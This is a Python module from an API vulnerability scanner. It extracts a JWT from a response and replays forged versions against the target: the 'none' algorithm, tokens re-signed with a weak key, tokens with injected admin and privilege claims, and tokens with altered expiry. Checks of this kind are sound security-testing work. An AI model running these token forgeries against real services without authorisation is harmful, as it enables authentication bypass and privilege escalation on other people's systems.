#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin
import json
import jwt
import base64
from RAGScripts.utils.logger import setup_scanner_logger

async def check_jwt_vulnerabilities(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Extract JWT from initial response
        token = extract_jwt(initial_response)
        if not token:
            return findings
        
        # Test cases for JWT abuse
        test_cases = [
            {
                'name': 'None algorithm',
                'modification': lambda t: jwt.encode(
                    jwt.decode(t, options={"verify_signature": False}),
                    key=None,
                    algorithm='none'
                )
            },
            {
                'name': 'Algorithm switching',
                'modification': lambda t: create_forged_token(t, 'HS256')
            },
            {
                'name': 'Token tampering',
                'modification': lambda t: tamper_payload(t, {'role': 'admin', 'privileges': ['all']})
            },
            {
                'name': 'Expired token',
                'modification': lambda t: modify_expiration(t, -3600)  # Set expiration to 1 hour ago
            }
        ]
        
        headers = initial_response.request.headers
        
        for test in test_cases:
            try:
                modified_token = test['modification'](token)
                headers['Authorization'] = f'Bearer {modified_token}'
                
                response = requests.request(
                    method,
                    test_url,
                    headers=headers,
                    timeout=5
                )
                
                if is_jwt_vulnerable(response, test):
                    findings.append({
                        "type": "JWT Abuse",
                        "detail": f"Potential {test['name']} vulnerability",
                        "evidence": {
                            "url": test_url,
                            "original_token": token,
                            "modified_token": modified_token,
                            "status_code": response.status_code,
                            "response": response.text[:200]
                        }
                    })
                    
            except requests.exceptions.RequestException:
                continue
                
    except Exception as e:
        print(f"Error in JWT check: {str(e)}")
    
    return findings

def extract_jwt(response: requests.Response) -> Optional[str]:
    # Check Authorization header
    auth_header = response.request.headers.get('Authorization', '')
    if 'Bearer ' in auth_header:
        return auth_header.split('Bearer ')[1]
    
    # Check response body for JWT
    try:
        body = response.json()
        candidates = ['token', 'access_token', 'jwt', 'id_token']
        for candidate in candidates:
            if candidate in body:
                return body[candidate]
    except:
        pass
    
    # Check cookies
    for cookie in response.cookies:
        if any(jwt_name in cookie.name.lower() for jwt_name in ['jwt', 'token', 'auth']):
            return cookie.value
    
    return None

def create_forged_token(token: str, new_alg: str) -> str:
    try:
        # Decode without verification
        payload = jwt.decode(token, options={"verify_signature": False})
        # Create new token with weak key
        return jwt.encode(payload, 'weak_secret', algorithm=new_alg)
    except:
        return token

def tamper_payload(token: str, additions: Dict) -> str:
    try:
        # Decode without verification
        payload = jwt.decode(token, options={"verify_signature": False})
        # Add malicious claims
        payload.update(additions)
        # Encode with original header
        header = jwt.get_unverified_header(token)
        return jwt.encode(payload, 'dummy_key', algorithm=header['alg'])
    except:
        return token

def modify_expiration(token: str, time_shift: int) -> str:
    try:
        # Decode without verification
        payload = jwt.decode(token, options={"verify_signature": False})
        if 'exp' in payload:
            payload['exp'] += time_shift
        # Encode with original header
        header = jwt.get_unverified_header(token)
        return jwt.encode(payload, 'dummy_key', algorithm=header['alg'])
    except:
        return token

def is_jwt_vulnerable(response: requests.Response, test: Dict) -> bool:
    try:
        response_json = response.json()
    except json.JSONDecodeError:
        response_json = {}
    
    response_text = json.dumps(response_json).lower()
    
    # Check for successful authentication/authorization
    if response.status_code == 200:
        success_indicators = [
            'authenticated',
            'authorized',
            'success',
            'welcome',
            'profile',
            'admin',
            'dashboard'
        ]
        if any(indicator in response_text for indicator in success_indicators):
            return True
    
    # Check for specific vulnerabilities
    if test['name'] == 'None algorithm':
        if response.status_code < 400:
            return True
    
    if test['name'] == 'Algorithm switching':
        if response.status_code < 400 and 'error' not in response_text:
            return True
    
    if test['name'] == 'Token tampering':
        if response.status_code < 400 and ('admin' in response_text or 'privileges' in response_text):
            return True
    
    if test['name'] == 'Expired token':
        if response.status_code < 400 and 'expired' not in response_text:
            return True
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_jwt_vulnerabilities(
            "http://localhost:5000",
            "/api/secure",
            "GET",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())